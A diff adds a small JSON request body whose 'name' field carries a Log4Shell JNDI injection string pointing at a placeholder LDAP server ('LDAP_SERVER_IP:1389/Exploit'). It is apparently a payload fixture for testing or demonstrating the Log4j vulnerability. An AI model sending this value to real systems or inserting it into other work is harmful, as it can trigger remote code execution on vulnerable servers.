@@ -1,0 +1,5 @@
+{
+  "body": {
+    "name": "${jndi:ldap://LDAP_SERVER_IP:1389/Exploit}"
+  }
+}
